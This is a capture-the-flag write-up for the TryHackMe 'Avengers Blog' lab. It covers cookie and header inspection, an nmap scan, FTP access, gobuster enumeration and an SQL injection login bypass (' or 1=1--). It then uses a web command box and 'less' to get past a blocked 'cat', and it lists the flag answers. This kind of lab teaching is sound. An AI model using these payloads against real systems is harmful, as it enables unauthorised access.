## Avengers Blog Writeup

    Box IP Addresses:

    10.10.0.17

This is a pretty simple one so it'll be short and sweet.

[Task 2] Cookies

We find flag1 by navigating to the IP above, and viewing the cookie editor extension in Firefox:

![](images/2020-08-25-10-59-31.png)

flag1: cookie_secrets

[Task 3] HTTP Headers

We find flag2 by starting up BurpSuite, and refreshing the page to intercept the GET requests + responses. We can see flag2 in the header:

![](images/2020-08-25-11-04-07.png)

flag2: headers_are_important

[Task 4] Enumeration and FTP

First we can run an nmap:

    kali@kali-[10.8.82.167]:~/labs/tryhackme/avengers-blog/docs$ nmap -sC -sV 10.10.0.17
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-25 11:06 EDT
    Nmap scan report for 10.10.0.17
    Host is up (0.035s latency).
    Not shown: 997 closed ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 95:21:f3:a8:14:35:ac:29:6b:9f:a5:ca:01:26:03:85 (RSA)
    |   256 5f:0c:21:2f:56:1d:32:c1:58:45:84:32:bc:f0:65:09 (ECDSA)
    |_  256 03:3c:45:71:d3:7a:58:8b:7b:6c:89:99:f8:8e:cb:ce (ED25519)
    80/tcp open  http    Node.js Express framework
    |_http-title: Avengers! Assemble!
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.43 seconds

We can see Ports 21 (FTP), 22 (SSH), and 80 (HTTP) are open.

We've been given the username + password for the FTP:

`We will be asked for a username (groot) and a password (iamgroot).`

We can try to access the ftp share by typing: 

    ftp 10.10.0.17

and use "dir" ≈ ls, and "get" ≈ download file.

![](images/2020-08-25-11-20-29.png)

The file is automatically downloaded into the directory we were in when we entered FTP so just cat the flag3.txt file:

flag3: 8fc651a739befc58d450dc48e1f1fd2e

[Task 5] GoBuster

We can run Gobuster to find the login page:

    kali@kali-[10.8.82.167]:~/labs/tryhackme/avengers-blog/docs$ gobuster dir -u http://10.10.0.17 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![](images/2020-08-25-11-47-50.png)

There is a /portal directory, that leads to a login page.

![](images/2020-08-25-11-48-55.png)

We can log in using the following SQL Injection:

' or 1=1--

This essentially means:

SELECT user FROM table where USER = ' ' or 1=1--' AND password = ' ' or 1=1--'

Reason for the double dash: The double-dash is used to comment the rest of the line. In MySQL however this operator must be followed by at least one whitespace or control character.

Source: https://www.sqlinjection.net/comments/

Once logged in we're welcomed with this page: http://10.10.0.17/home

![](images/2020-08-25-11-54-37.png)

Looking at the page source, there are 223 lines of code:

![](images/2020-08-25-11-56-06.png)

We can type in code in the command text box, and get output above. Let's look for flag5.txt:

Command: find / -name flag5.txt 2>/dev/null

Output: /home/ubuntu/flag5.txt

![](images/2020-08-25-11-57-57.png)

Our working directory is /home/ubuntu/avengers, so we just need to go up one level and cat flag5.txt:

![](images/2020-08-25-11-58-38.png)

But it's disallowed!

Let's see what other packages are available on the system:

dpkg -l

Relevant output: ![](images/2020-08-25-12-01-36.png)

We can see that "less" is installed on the system, so let's use that to read the file:

Command : less ../flag5.txt

Output: d335e2d13f36558ba1e67969a1718af7

![](images/2020-08-25-12-00-35.png)

Complete!
